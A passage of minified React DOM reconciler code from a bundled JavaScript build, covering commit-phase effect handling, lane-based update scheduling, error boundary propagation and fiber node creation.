                        h.stateNode.nodeValue = u ? "" : h.memoizedProps;
                      } catch (y) {
                        kc(e, e.return, y);
                      }
                  } else if (
                    ((22 !== h.tag && 23 !== h.tag) ||
                      null === h.memoizedState ||
                      h === e) &&
                    null !== h.child
                  ) {
                    (h.child.return = h), (h = h.child);
                    continue;
                  }
                  if (h === e) break e;
                  for (; null === h.sibling; ) {
                    if (null === h.return || h.return === e) break e;
                    f === h && (f = null), (h = h.return);
                  }
                  f === h && (f = null),
                    (h.sibling.return = h.return),
                    (h = h.sibling);
                }
              }
              break;
            case 19:
              yl(t, e), ml(e), 4 & r && gl(e);
            case 21:
          }
        }
        function ml(e) {
          var t = e.flags;
          if (2 & t) {
            try {
              e: {
                for (var n = e.return; null !== n; ) {
                  if (al(n)) {
                    var r = n;
                    break e;
                  }
                  n = n.return;
                }
                throw Error(o(160));
              }
              switch (r.tag) {
                case 5:
                  var i = r.stateNode;
                  32 & r.flags && (he(i, ""), (r.flags &= -33)),
                    ul(e, ll(e), i);
                  break;
                case 3:
                case 4:
                  var s = r.stateNode.containerInfo;
                  cl(e, ll(e), s);
                  break;
                default:
                  throw Error(o(161));
              }
            } catch (a) {
              kc(e, e.return, a);
            }
            e.flags &= -3;
          }
          4096 & t && (e.flags &= -4097);
        }
        function bl(e, t, n) {
          (Qa = e), vl(e, t, n);
        }
        function vl(e, t, n) {
          for (var r = 0 !== (1 & e.mode); null !== Qa; ) {
            var i = Qa,
              o = i.child;
            if (22 === i.tag && r) {
              var s = null !== i.memoizedState || Za;
              if (!s) {
                var a = i.alternate,
                  l = (null !== a && null !== a.memoizedState) || Ja;
                a = Za;
                var c = Ja;
                if (((Za = s), (Ja = l) && !c))
                  for (Qa = i; null !== Qa; )
                    (l = (s = Qa).child),
                      22 === s.tag && null !== s.memoizedState
                        ? xl(i)
                        : null !== l
                        ? ((l.return = s), (Qa = l))
                        : xl(i);
                for (; null !== o; ) (Qa = o), vl(o, t, n), (o = o.sibling);
                (Qa = i), (Za = a), (Ja = c);
              }
              El(e);
            } else
              0 !== (8772 & i.subtreeFlags) && null !== o
                ? ((o.return = i), (Qa = o))
                : El(e);
          }
        }
        function El(e) {
          for (; null !== Qa; ) {
            var t = Qa;
            if (0 !== (8772 & t.flags)) {
              var n = t.alternate;
              try {
                if (0 !== (8772 & t.flags))
                  switch (t.tag) {
                    case 0:
                    case 11:
                    case 15:
                      Ja || il(5, t);
                      break;
                    case 1:
                      var r = t.stateNode;
                      if (4 & t.flags && !Ja)
                        if (null === n) r.componentDidMount();
                        else {
                          var i =
                            t.elementType === t.type
                              ? n.memoizedProps
                              : wo(t.type, n.memoizedProps);
                          r.componentDidUpdate(
                            i,
                            n.memoizedState,
                            r.__reactInternalSnapshotBeforeUpdate
                          );
                        }
                      var s = t.updateQueue;
                      null !== s && Do(t, s, r);
                      break;
                    case 3:
                      var a = t.updateQueue;
                      if (null !== a) {
                        if (((n = null), null !== t.child))
                          switch (t.child.tag) {
                            case 5:
                            case 1:
                              n = t.child.stateNode;
                          }
                        Do(t, a, n);
                      }
                      break;
                    case 5:
                      var l = t.stateNode;
                      if (null === n && 4 & t.flags) {
                        n = l;
                        var c = t.memoizedProps;
                        switch (t.type) {
                          case "button":
                          case "input":
                          case "select":
                          case "textarea":
                            c.autoFocus && n.focus();
                            break;
                          case "img":
                            c.src && (n.src = c.src);
                        }
                      }
                      break;
                    case 6:
                    case 4:
                    case 12:
                    case 19:
                    case 17:
                    case 21:
                    case 22:
                    case 23:
                    case 25:
                      break;
                    case 13:
                      if (null === t.memoizedState) {
                        var u = t.alternate;
                        if (null !== u) {
                          var f = u.memoizedState;
                          if (null !== f) {
                            var h = f.dehydrated;
                            null !== h && jt(h);
                          }
                        }
                      }
                      break;
                    default:
                      throw Error(o(163));
                  }
                Ja || (512 & t.flags && ol(t));
              } catch (d) {
                kc(t, t.return, d);
              }
            }
            if (t === e) {
              Qa = null;
              break;
            }
            if (null !== (n = t.sibling)) {
              (n.return = t.return), (Qa = n);
              break;
            }
            Qa = t.return;
          }
        }
        function Sl(e) {
          for (; null !== Qa; ) {
            var t = Qa;
            if (t === e) {
              Qa = null;
              break;
            }
            var n = t.sibling;
            if (null !== n) {
              (n.return = t.return), (Qa = n);
              break;
            }
            Qa = t.return;
          }
        }
        function xl(e) {
          for (; null !== Qa; ) {
            var t = Qa;
            try {
              switch (t.tag) {
                case 0:
                case 11:
                case 15:
                  var n = t.return;
                  try {
                    il(4, t);
                  } catch (l) {
                    kc(t, n, l);
                  }
                  break;
                case 1:
                  var r = t.stateNode;
                  if ("function" === typeof r.componentDidMount) {
                    var i = t.return;
                    try {
                      r.componentDidMount();
                    } catch (l) {
                      kc(t, i, l);
                    }
                  }
                  var o = t.return;
                  try {
                    ol(t);
                  } catch (l) {
                    kc(t, o, l);
                  }
                  break;
                case 5:
                  var s = t.return;
                  try {
                    ol(t);
                  } catch (l) {
                    kc(t, s, l);
                  }
              }
            } catch (l) {
              kc(t, t.return, l);
            }
            if (t === e) {
              Qa = null;
              break;
            }
            var a = t.sibling;
            if (null !== a) {
              (a.return = t.return), (Qa = a);
              break;
            }
            Qa = t.return;
          }
        }
        var Al,
          kl = Math.ceil,
          Tl = v.ReactCurrentDispatcher,
          Cl = v.ReactCurrentOwner,
          Il = v.ReactCurrentBatchConfig,
          Ol = 0,
          Bl = null,
          Pl = null,
          _l = 0,
          Ul = 0,
          Nl = Ai(0),
          Rl = 0,
          Ll = null,
          $l = 0,
          Hl = 0,
          Dl = 0,
          Ml = null,
          Fl = null,
          jl = 0,
          zl = 1 / 0,
          Kl = null,
          Wl = !1,
          Vl = null,
          ql = null,
          Gl = !1,
          Yl = null,
          Zl = 0,
          Jl = 0,
          Xl = null,
          Ql = -1,
          ec = 0;
        function tc() {
          return 0 !== (6 & Ol) ? Je() : -1 !== Ql ? Ql : (Ql = Je());
        }
        function nc(e) {
          return 0 === (1 & e.mode)
            ? 1
            : 0 !== (2 & Ol) && 0 !== _l
            ? _l & -_l
            : null !== yo.transition
            ? (0 === ec && (ec = gt()), ec)
            : 0 !== (e = bt)
            ? e
            : (e = void 0 === (e = window.event) ? 16 : Zt(e.type));
        }
        function rc(e, t, n, r) {
          if (50 < Jl) throw ((Jl = 0), (Xl = null), Error(o(185)));
          wt(e, n, r),
            (0 !== (2 & Ol) && e === Bl) ||
              (e === Bl && (0 === (2 & Ol) && (Hl |= n), 4 === Rl && lc(e, _l)),
              ic(e, r),
              1 === n &&
                0 === Ol &&
                0 === (1 & t.mode) &&
                ((zl = Je() + 500), Di && ji()));
        }
        function ic(e, t) {
          var n = e.callbackNode;
          !(function (e, t) {
            for (
              var n = e.suspendedLanes,
                r = e.pingedLanes,
                i = e.expirationTimes,
                o = e.pendingLanes;
              0 < o;

            ) {
              var s = 31 - st(o),
                a = 1 << s,
                l = i[s];
              -1 === l
                ? (0 !== (a & n) && 0 === (a & r)) || (i[s] = dt(a, t))
                : l <= t && (e.expiredLanes |= a),
                (o &= ~a);
            }
          })(e, t);
          var r = ht(e, e === Bl ? _l : 0);
          if (0 === r)
            null !== n && Ge(n),
              (e.callbackNode = null),
              (e.callbackPriority = 0);
          else if (((t = r & -r), e.callbackPriority !== t)) {
            if ((null != n && Ge(n), 1 === t))
              0 === e.tag
                ? (function (e) {
                    (Di = !0), Fi(e);
                  })(cc.bind(null, e))
                : Fi(cc.bind(null, e)),
                si(function () {
                  0 === (6 & Ol) && ji();
                }),
                (n = null);
            else {
              switch (vt(r)) {
                case 1:
                  n = Qe;
                  break;
                case 4:
                  n = et;
                  break;
                case 16:
                default:
                  n = tt;
                  break;
                case 536870912:
                  n = rt;
              }
              n = Bc(n, oc.bind(null, e));
            }
            (e.callbackPriority = t), (e.callbackNode = n);
          }
        }
        function oc(e, t) {
          if (((Ql = -1), (ec = 0), 0 !== (6 & Ol))) throw Error(o(327));
          var n = e.callbackNode;
          if (xc() && e.callbackNode !== n) return null;
          var r = ht(e, e === Bl ? _l : 0);
          if (0 === r) return null;
          if (0 !== (30 & r) || 0 !== (r & e.expiredLanes) || t) t = wc(e, r);
          else {
            t = r;
            var i = Ol;
            Ol |= 2;
            var s = gc();
            for (
              (Bl === e && _l === t) ||
              ((Kl = null), (zl = Je() + 500), dc(e, t));
              ;

            )
              try {
                bc();
                break;
              } catch (l) {
                pc(e, l);
              }
            So(),
              (Tl.current = s),
              (Ol = i),
              null !== Pl ? (t = 0) : ((Bl = null), (_l = 0), (t = Rl));
          }
          if (0 !== t) {
            if (
              (2 === t && 0 !== (i = pt(e)) && ((r = i), (t = sc(e, i))),
              1 === t)
            )
              throw ((n = Ll), dc(e, 0), lc(e, r), ic(e, Je()), n);
            if (6 === t) lc(e, r);
            else {
              if (
                ((i = e.current.alternate),
                0 === (30 & r) &&
                  !(function (e) {
                    for (var t = e; ; ) {
                      if (16384 & t.flags) {
                        var n = t.updateQueue;
                        if (null !== n && null !== (n = n.stores))
                          for (var r = 0; r < n.length; r++) {
                            var i = n[r],
                              o = i.getSnapshot;
                            i = i.value;
                            try {
                              if (!ar(o(), i)) return !1;
                            } catch (a) {
                              return !1;
                            }
                          }
                      }
                      if (((n = t.child), 16384 & t.subtreeFlags && null !== n))
                        (n.return = t), (t = n);
                      else {
                        if (t === e) break;
                        for (; null === t.sibling; ) {
                          if (null === t.return || t.return === e) return !0;
                          t = t.return;
                        }
                        (t.sibling.return = t.return), (t = t.sibling);
                      }
                    }
                    return !0;
                  })(i) &&
                  (2 === (t = wc(e, r)) &&
                    0 !== (s = pt(e)) &&
                    ((r = s), (t = sc(e, s))),
                  1 === t))
              )
                throw ((n = Ll), dc(e, 0), lc(e, r), ic(e, Je()), n);
              switch (((e.finishedWork = i), (e.finishedLanes = r), t)) {
                case 0:
                case 1:
                  throw Error(o(345));
                case 2:
                case 5:
                  Sc(e, Fl, Kl);
                  break;
                case 3:
                  if (
                    (lc(e, r),
                    (130023424 & r) === r && 10 < (t = jl + 500 - Je()))
                  ) {
                    if (0 !== ht(e, 0)) break;
                    if (((i = e.suspendedLanes) & r) !== r) {
                      tc(), (e.pingedLanes |= e.suspendedLanes & i);
                      break;
                    }
                    e.timeoutHandle = ri(Sc.bind(null, e, Fl, Kl), t);
                    break;
                  }
                  Sc(e, Fl, Kl);
                  break;
                case 4:
                  if ((lc(e, r), (4194240 & r) === r)) break;
                  for (t = e.eventTimes, i = -1; 0 < r; ) {
                    var a = 31 - st(r);
                    (s = 1 << a), (a = t[a]) > i && (i = a), (r &= ~s);
                  }
                  if (
                    ((r = i),
                    10 <
                      (r =
                        (120 > (r = Je() - r)
                          ? 120
                          : 480 > r
                          ? 480
                          : 1080 > r
                          ? 1080
                          : 1920 > r
                          ? 1920
                          : 3e3 > r
                          ? 3e3
                          : 4320 > r
                          ? 4320
                          : 1960 * kl(r / 1960)) - r))
                  ) {
                    e.timeoutHandle = ri(Sc.bind(null, e, Fl, Kl), r);
                    break;
                  }
                  Sc(e, Fl, Kl);
                  break;
                default:
                  throw Error(o(329));
              }
            }
          }
          return ic(e, Je()), e.callbackNode === n ? oc.bind(null, e) : null;
        }
        function sc(e, t) {
          var n = Ml;
          return (
            e.current.memoizedState.isDehydrated && (dc(e, t).flags |= 256),
            2 !== (e = wc(e, t)) && ((t = Fl), (Fl = n), null !== t && ac(t)),
            e
          );
        }
        function ac(e) {
          null === Fl ? (Fl = e) : Fl.push.apply(Fl, e);
        }
        function lc(e, t) {
          for (
            t &= ~Dl,
              t &= ~Hl,
              e.suspendedLanes |= t,
              e.pingedLanes &= ~t,
              e = e.expirationTimes;
            0 < t;

          ) {
            var n = 31 - st(t),
              r = 1 << n;
            (e[n] = -1), (t &= ~r);
          }
        }
        function cc(e) {
          if (0 !== (6 & Ol)) throw Error(o(327));
          xc();
          var t = ht(e, 0);
          if (0 === (1 & t)) return ic(e, Je()), null;
          var n = wc(e, t);
          if (0 !== e.tag && 2 === n) {
            var r = pt(e);
            0 !== r && ((t = r), (n = sc(e, r)));
          }
          if (1 === n) throw ((n = Ll), dc(e, 0), lc(e, t), ic(e, Je()), n);
          if (6 === n) throw Error(o(345));
          return (
            (e.finishedWork = e.current.alternate),
            (e.finishedLanes = t),
            Sc(e, Fl, Kl),
            ic(e, Je()),
            null
          );
        }
        function uc(e, t) {
          var n = Ol;
          Ol |= 1;
          try {
            return e(t);
          } finally {
            0 === (Ol = n) && ((zl = Je() + 500), Di && ji());
          }
        }
        function fc(e) {
          null !== Yl && 0 === Yl.tag && 0 === (6 & Ol) && xc();
          var t = Ol;
          Ol |= 1;
          var n = Il.transition,
            r = bt;
          try {
            if (((Il.transition = null), (bt = 1), e)) return e();
          } finally {
            (bt = r), (Il.transition = n), 0 === (6 & (Ol = t)) && ji();
          }
        }
        function hc() {
          (Ul = Nl.current), ki(Nl);
        }
        function dc(e, t) {
          (e.finishedWork = null), (e.finishedLanes = 0);
          var n = e.timeoutHandle;
          if ((-1 !== n && ((e.timeoutHandle = -1), ii(n)), null !== Pl))
            for (n = Pl.return; null !== n; ) {
              var r = n;
              switch ((to(r), r.tag)) {
                case 1:
                  null !== (r = r.type.childContextTypes) &&
                    void 0 !== r &&
                    Ui();
                  break;
                case 3:
                  os(), ki(Oi), ki(Ii), fs();
                  break;
                case 5:
                  as(r);
                  break;
                case 4:
                  os();
                  break;
                case 13:
                case 19:
                  ki(ls);
                  break;
                case 10:
                  xo(r.type._context);
                  break;
                case 22:
                case 23:
                  hc();
              }
              n = n.return;
            }
          if (
            ((Bl = e),
            (Pl = e = Nc(e.current, null)),
            (_l = Ul = t),
            (Rl = 0),
            (Ll = null),
            (Dl = Hl = $l = 0),
            (Fl = Ml = null),
            null !== Co)
          ) {
            for (t = 0; t < Co.length; t++)
              if (null !== (r = (n = Co[t]).interleaved)) {
                n.interleaved = null;
                var i = r.next,
                  o = n.pending;
                if (null !== o) {
                  var s = o.next;
                  (o.next = i), (r.next = s);
                }
                n.pending = r;
              }
            Co = null;
          }
          return e;
        }
        function pc(e, t) {
          for (;;) {
            var n = Pl;
            try {
              if ((So(), (hs.current = sa), ms)) {
                for (var r = gs.memoizedState; null !== r; ) {
                  var i = r.queue;
                  null !== i && (i.pending = null), (r = r.next);
                }
                ms = !1;
              }
              if (
                ((ps = 0),
                (ws = ys = gs = null),
                (bs = !1),
                (vs = 0),
                (Cl.current = null),
                null === n || null === n.return)
              ) {
                (Rl = 1), (Ll = t), (Pl = null);
                break;
              }
              e: {
                var s = e,
                  a = n.return,
                  l = n,
                  c = t;
                if (
                  ((t = _l),
                  (l.flags |= 32768),
                  null !== c &&
                    "object" === typeof c &&
                    "function" === typeof c.then)
                ) {
                  var u = c,
                    f = l,
                    h = f.tag;
                  if (0 === (1 & f.mode) && (0 === h || 11 === h || 15 === h)) {
                    var d = f.alternate;
                    d
                      ? ((f.updateQueue = d.updateQueue),
                        (f.memoizedState = d.memoizedState),
                        (f.lanes = d.lanes))
                      : ((f.updateQueue = null), (f.memoizedState = null));
                  }
                  var p = wa(a);
                  if (null !== p) {
                    (p.flags &= -257),
                      ma(p, a, l, 0, t),
                      1 & p.mode && ya(s, u, t),
                      (c = u);
                    var g = (t = p).updateQueue;
                    if (null === g) {
                      var y = new Set();
                      y.add(c), (t.updateQueue = y);
                    } else g.add(c);
                    break e;
                  }
                  if (0 === (1 & t)) {
                    ya(s, u, t), yc();
                    break e;
                  }
                  c = Error(o(426));
                } else if (io && 1 & l.mode) {
                  var w = wa(a);
                  if (null !== w) {
                    0 === (65536 & w.flags) && (w.flags |= 256),
                      ma(w, a, l, 0, t),
                      go(ua(c, l));
                    break e;
                  }
                }
                (s = c = ua(c, l)),
                  4 !== Rl && (Rl = 2),
                  null === Ml ? (Ml = [s]) : Ml.push(s),
                  (s = a);
                do {
                  switch (s.tag) {
                    case 3:
                      (s.flags |= 65536),
                        (t &= -t),
                        (s.lanes |= t),
                        $o(s, pa(0, c, t));
                      break e;
                    case 1:
                      l = c;
                      var m = s.type,
                        b = s.stateNode;
                      if (
                        0 === (128 & s.flags) &&
                        ("function" === typeof m.getDerivedStateFromError ||
                          (null !== b &&
                            "function" === typeof b.componentDidCatch &&
                            (null === ql || !ql.has(b))))
                      ) {
                        (s.flags |= 65536),
                          (t &= -t),
                          (s.lanes |= t),
                          $o(s, ga(s, l, t));
                        break e;
                      }
                  }
                  s = s.return;
                } while (null !== s);
              }
              Ec(n);
            } catch (v) {
              (t = v), Pl === n && null !== n && (Pl = n = n.return);
              continue;
            }
            break;
          }
        }
        function gc() {
          var e = Tl.current;
          return (Tl.current = sa), null === e ? sa : e;
        }
        function yc() {
          (0 !== Rl && 3 !== Rl && 2 !== Rl) || (Rl = 4),
            null === Bl ||
              (0 === (268435455 & $l) && 0 === (268435455 & Hl)) ||
              lc(Bl, _l);
        }
        function wc(e, t) {
          var n = Ol;
          Ol |= 2;
          var r = gc();
          for ((Bl === e && _l === t) || ((Kl = null), dc(e, t)); ; )
            try {
              mc();
              break;
            } catch (i) {
              pc(e, i);
            }
          if ((So(), (Ol = n), (Tl.current = r), null !== Pl))
            throw Error(o(261));
          return (Bl = null), (_l = 0), Rl;
        }
        function mc() {
          for (; null !== Pl; ) vc(Pl);
        }
        function bc() {
          for (; null !== Pl && !Ye(); ) vc(Pl);
        }
        function vc(e) {
          var t = Al(e.alternate, e, Ul);
          (e.memoizedProps = e.pendingProps),
            null === t ? Ec(e) : (Pl = t),
            (Cl.current = null);
        }
        function Ec(e) {
          var t = e;
          do {
            var n = t.alternate;
            if (((e = t.return), 0 === (32768 & t.flags))) {
              if (null !== (n = Ga(n, t, Ul))) return void (Pl = n);
            } else {
              if (null !== (n = Ya(n, t)))
                return (n.flags &= 32767), void (Pl = n);
              if (null === e) return (Rl = 6), void (Pl = null);
              (e.flags |= 32768), (e.subtreeFlags = 0), (e.deletions = null);
            }
            if (null !== (t = t.sibling)) return void (Pl = t);
            Pl = t = e;
          } while (null !== t);
          0 === Rl && (Rl = 5);
        }
        function Sc(e, t, n) {
          var r = bt,
            i = Il.transition;
          try {
            (Il.transition = null),
              (bt = 1),
              (function (e, t, n, r) {
                do {
                  xc();
                } while (null !== Yl);
                if (0 !== (6 & Ol)) throw Error(o(327));
                n = e.finishedWork;
                var i = e.finishedLanes;
                if (null === n) return null;
                if (
                  ((e.finishedWork = null),
                  (e.finishedLanes = 0),
                  n === e.current)
                )
                  throw Error(o(177));
                (e.callbackNode = null), (e.callbackPriority = 0);
                var s = n.lanes | n.childLanes;
                if (
                  ((function (e, t) {
                    var n = e.pendingLanes & ~t;
                    (e.pendingLanes = t),
                      (e.suspendedLanes = 0),
                      (e.pingedLanes = 0),
                      (e.expiredLanes &= t),
                      (e.mutableReadLanes &= t),
                      (e.entangledLanes &= t),
                      (t = e.entanglements);
                    var r = e.eventTimes;
                    for (e = e.expirationTimes; 0 < n; ) {
                      var i = 31 - st(n),
                        o = 1 << i;
                      (t[i] = 0), (r[i] = -1), (e[i] = -1), (n &= ~o);
                    }
                  })(e, s),
                  e === Bl && ((Pl = Bl = null), (_l = 0)),
                  (0 === (2064 & n.subtreeFlags) && 0 === (2064 & n.flags)) ||
                    Gl ||
                    ((Gl = !0),
                    Bc(tt, function () {
                      return xc(), null;
                    })),
                  (s = 0 !== (15990 & n.flags)),
                  0 !== (15990 & n.subtreeFlags) || s)
                ) {
                  (s = Il.transition), (Il.transition = null);
                  var a = bt;
                  bt = 1;
                  var l = Ol;
                  (Ol |= 4),
                    (Cl.current = null),
                    (function (e, t) {
                      if (((ei = Kt), dr((e = hr())))) {
                        if ("selectionStart" in e)
                          var n = {
                            start: e.selectionStart,
                            end: e.selectionEnd,
                          };
                        else
                          e: {
                            var r =
                              (n =
                                ((n = e.ownerDocument) && n.defaultView) ||
                                window).getSelection && n.getSelection();
                            if (r && 0 !== r.rangeCount) {
                              n = r.anchorNode;
                              var i = r.anchorOffset,
                                s = r.focusNode;
                              r = r.focusOffset;
                              try {
                                n.nodeType, s.nodeType;
                              } catch (E) {
                                n = null;
                                break e;
                              }
                              var a = 0,
                                l = -1,
                                c = -1,
                                u = 0,
                                f = 0,
                                h = e,
                                d = null;
                              t: for (;;) {
                                for (
                                  var p;
                                  h !== n ||
                                    (0 !== i && 3 !== h.nodeType) ||
                                    (l = a + i),
                                    h !== s ||
                                      (0 !== r && 3 !== h.nodeType) ||
                                      (c = a + r),
                                    3 === h.nodeType &&
                                      (a += h.nodeValue.length),
                                    null !== (p = h.firstChild);

                                )
                                  (d = h), (h = p);
                                for (;;) {
                                  if (h === e) break t;
                                  if (
                                    (d === n && ++u === i && (l = a),
                                    d === s && ++f === r && (c = a),
                                    null !== (p = h.nextSibling))
                                  )
                                    break;
                                  d = (h = d).parentNode;
                                }
                                h = p;
                              }
                              n =
                                -1 === l || -1 === c
                                  ? null
                                  : { start: l, end: c };
                            } else n = null;
                          }
                        n = n || { start: 0, end: 0 };
                      } else n = null;
                      for (
                        ti = { focusedElem: e, selectionRange: n },
                          Kt = !1,
                          Qa = t;
                        null !== Qa;

                      )
                        if (
                          ((e = (t = Qa).child),
                          0 !== (1028 & t.subtreeFlags) && null !== e)
                        )
                          (e.return = t), (Qa = e);
                        else
                          for (; null !== Qa; ) {
                            t = Qa;
                            try {
                              var g = t.alternate;
                              if (0 !== (1024 & t.flags))
                                switch (t.tag) {
                                  case 0:
                                  case 11:
                                  case 15:
                                  case 5:
                                  case 6:
                                  case 4:
                                  case 17:
                                    break;
                                  case 1:
                                    if (null !== g) {
                                      var y = g.memoizedProps,
                                        w = g.memoizedState,
                                        m = t.stateNode,
                                        b = m.getSnapshotBeforeUpdate(
                                          t.elementType === t.type
                                            ? y
                                            : wo(t.type, y),
                                          w
                                        );
                                      m.__reactInternalSnapshotBeforeUpdate = b;
                                    }
                                    break;
                                  case 3:
                                    var v = t.stateNode.containerInfo;
                                    1 === v.nodeType
                                      ? (v.textContent = "")
                                      : 9 === v.nodeType &&
                                        v.documentElement &&
                                        v.removeChild(v.documentElement);
                                    break;
                                  default:
                                    throw Error(o(163));
                                }
                            } catch (E) {
                              kc(t, t.return, E);
                            }
                            if (null !== (e = t.sibling)) {
                              (e.return = t.return), (Qa = e);
                              break;
                            }
                            Qa = t.return;
                          }
                      (g = nl), (nl = !1);
                    })(e, n),
                    wl(n, e),
                    pr(ti),
                    (Kt = !!ei),
                    (ti = ei = null),
                    (e.current = n),
                    bl(n, e, i),
                    Ze(),
                    (Ol = l),
                    (bt = a),
                    (Il.transition = s);
                } else e.current = n;
                if (
                  (Gl && ((Gl = !1), (Yl = e), (Zl = i)),
                  (s = e.pendingLanes),
                  0 === s && (ql = null),
                  (function (e) {
                    if (ot && "function" === typeof ot.onCommitFiberRoot)
                      try {
                        ot.onCommitFiberRoot(
                          it,
                          e,
                          void 0,
                          128 === (128 & e.current.flags)
                        );
                      } catch (t) {}
                  })(n.stateNode),
                  ic(e, Je()),
                  null !== t)
                )
                  for (r = e.onRecoverableError, n = 0; n < t.length; n++)
                    (i = t[n]),
                      r(i.value, { componentStack: i.stack, digest: i.digest });
                if (Wl) throw ((Wl = !1), (e = Vl), (Vl = null), e);
                0 !== (1 & Zl) && 0 !== e.tag && xc(),
                  (s = e.pendingLanes),
                  0 !== (1 & s)
                    ? e === Xl
                      ? Jl++
                      : ((Jl = 0), (Xl = e))
                    : (Jl = 0),
                  ji();
              })(e, t, n, r);
          } finally {
            (Il.transition = i), (bt = r);
          }
          return null;
        }
        function xc() {
          if (null !== Yl) {
            var e = vt(Zl),
              t = Il.transition,
              n = bt;
            try {
              if (((Il.transition = null), (bt = 16 > e ? 16 : e), null === Yl))
                var r = !1;
              else {
                if (((e = Yl), (Yl = null), (Zl = 0), 0 !== (6 & Ol)))
                  throw Error(o(331));
                var i = Ol;
                for (Ol |= 4, Qa = e.current; null !== Qa; ) {
                  var s = Qa,
                    a = s.child;
                  if (0 !== (16 & Qa.flags)) {
                    var l = s.deletions;
                    if (null !== l) {
                      for (var c = 0; c < l.length; c++) {
                        var u = l[c];
                        for (Qa = u; null !== Qa; ) {
                          var f = Qa;
                          switch (f.tag) {
                            case 0:
                            case 11:
                            case 15:
                              rl(8, f, s);
                          }
                          var h = f.child;
                          if (null !== h) (h.return = f), (Qa = h);
                          else
                            for (; null !== Qa; ) {
                              var d = (f = Qa).sibling,
                                p = f.return;
                              if ((sl(f), f === u)) {
                                Qa = null;
                                break;
                              }
                              if (null !== d) {
                                (d.return = p), (Qa = d);
                                break;
                              }
                              Qa = p;
                            }
                        }
                      }
                      var g = s.alternate;
                      if (null !== g) {
                        var y = g.child;
                        if (null !== y) {
                          g.child = null;
                          do {
                            var w = y.sibling;
                            (y.sibling = null), (y = w);
                          } while (null !== y);
                        }
                      }
                      Qa = s;
                    }
                  }
                  if (0 !== (2064 & s.subtreeFlags) && null !== a)
                    (a.return = s), (Qa = a);
                  else
                    e: for (; null !== Qa; ) {
                      if (0 !== (2048 & (s = Qa).flags))
                        switch (s.tag) {
                          case 0:
                          case 11:
                          case 15:
                            rl(9, s, s.return);
                        }
                      var m = s.sibling;
                      if (null !== m) {
                        (m.return = s.return), (Qa = m);
                        break e;
                      }
                      Qa = s.return;
                    }
                }
                var b = e.current;
                for (Qa = b; null !== Qa; ) {
                  var v = (a = Qa).child;
                  if (0 !== (2064 & a.subtreeFlags) && null !== v)
                    (v.return = a), (Qa = v);
                  else
                    e: for (a = b; null !== Qa; ) {
                      if (0 !== (2048 & (l = Qa).flags))
                        try {
                          switch (l.tag) {
                            case 0:
                            case 11:
                            case 15:
                              il(9, l);
                          }
                        } catch (S) {
                          kc(l, l.return, S);
                        }
                      if (l === a) {
                        Qa = null;
                        break e;
                      }
                      var E = l.sibling;
                      if (null !== E) {
                        (E.return = l.return), (Qa = E);
                        break e;
                      }
                      Qa = l.return;
                    }
                }
                if (
                  ((Ol = i),
                  ji(),
                  ot && "function" === typeof ot.onPostCommitFiberRoot)
                )
                  try {
                    ot.onPostCommitFiberRoot(it, e);
                  } catch (S) {}
                r = !0;
              }
              return r;
            } finally {
              (bt = n), (Il.transition = t);
            }
          }
          return !1;
        }
        function Ac(e, t, n) {
          (e = Ro(e, (t = pa(0, (t = ua(n, t)), 1)), 1)),
            (t = tc()),
            null !== e && (wt(e, 1, t), ic(e, t));
        }
        function kc(e, t, n) {
          if (3 === e.tag) Ac(e, e, n);
          else
            for (; null !== t; ) {
              if (3 === t.tag) {
                Ac(t, e, n);
                break;
              }
              if (1 === t.tag) {
                var r = t.stateNode;
                if (
                  "function" === typeof t.type.getDerivedStateFromError ||
                  ("function" === typeof r.componentDidCatch &&
                    (null === ql || !ql.has(r)))
                ) {
                  (t = Ro(t, (e = ga(t, (e = ua(n, e)), 1)), 1)),
                    (e = tc()),
                    null !== t && (wt(t, 1, e), ic(t, e));
                  break;
                }
              }
              t = t.return;
            }
        }
        function Tc(e, t, n) {
          var r = e.pingCache;
          null !== r && r.delete(t),
            (t = tc()),
            (e.pingedLanes |= e.suspendedLanes & n),
            Bl === e &&
              (_l & n) === n &&
              (4 === Rl ||
              (3 === Rl && (130023424 & _l) === _l && 500 > Je() - jl)
                ? dc(e, 0)
                : (Dl |= n)),
            ic(e, t);
        }
        function Cc(e, t) {
          0 === t &&
            (0 === (1 & e.mode)
              ? (t = 1)
              : ((t = ut), 0 === (130023424 & (ut <<= 1)) && (ut = 4194304)));
          var n = tc();
          null !== (e = Bo(e, t)) && (wt(e, t, n), ic(e, n));
        }
        function Ic(e) {
          var t = e.memoizedState,
            n = 0;
          null !== t && (n = t.retryLane), Cc(e, n);
        }
        function Oc(e, t) {
          var n = 0;
          switch (e.tag) {
            case 13:
              var r = e.stateNode,
                i = e.memoizedState;
              null !== i && (n = i.retryLane);
              break;
            case 19:
              r = e.stateNode;
              break;
            default:
              throw Error(o(314));
          }
          null !== r && r.delete(t), Cc(e, n);
        }
        function Bc(e, t) {
          return qe(e, t);
        }
        function Pc(e, t, n, r) {
          (this.tag = e),
            (this.key = n),
            (this.sibling =
              this.child =
              this.return =
              this.stateNode =
              this.type =
              this.elementType =
                null),
            (this.index = 0),
            (this.ref = null),
            (this.pendingProps = t),
            (this.dependencies =
              this.memoizedState =
              this.updateQueue =
              this.memoizedProps =
                null),
            (this.mode = r),
            (this.subtreeFlags = this.flags = 0),
            (this.deletions = null),
            (this.childLanes = this.lanes = 0),
            (this.alternate = null);
        }
        function _c(e, t, n, r) {
          return new Pc(e, t, n, r);
        }
        function Uc(e) {
          return !(!(e = e.prototype) || !e.isReactComponent);
        }
        function Nc(e, t) {
          var n = e.alternate;
          return (
            null === n
              ? (((n = _c(e.tag, t, e.key, e.mode)).elementType =
                  e.elementType),
                (n.type = e.type),
                (n.stateNode = e.stateNode),
                (n.alternate = e),
                (e.alternate = n))
              : ((n.pendingProps = t),
                (n.type = e.type),
                (n.flags = 0),
                (n.subtreeFlags = 0),
                (n.deletions = null)),
            (n.flags = 14680064 & e.flags),
            (n.childLanes = e.childLanes),
            (n.lanes = e.lanes),
            (n.child = e.child),
            (n.memoizedProps = e.memoizedProps),
            (n.memoizedState = e.memoizedState),
            (n.updateQueue = e.updateQueue),
            (t = e.dependencies),
            (n.dependencies =
              null === t
                ? null
                : { lanes: t.lanes, firstContext: t.firstContext }),
            (n.sibling = e.sibling),
            (n.index = e.index),
            (n.ref = e.ref),
            n
          );
        }
        function Rc(e, t, n, r, i, s) {
          var a = 2;
          if (((r = e), "function" === typeof e)) Uc(e) && (a = 1);
          else if ("string" === typeof e) a = 5;
          else
            e: switch (e) {
              case x:
                return Lc(n.children, i, s, t);
              case A:
                (a = 8), (i |= 8);
                break;
              case k:
                return (
                  ((e = _c(12, n, t, 2 | i)).elementType = k), (e.lanes = s), e
                );
              case O:
                return (
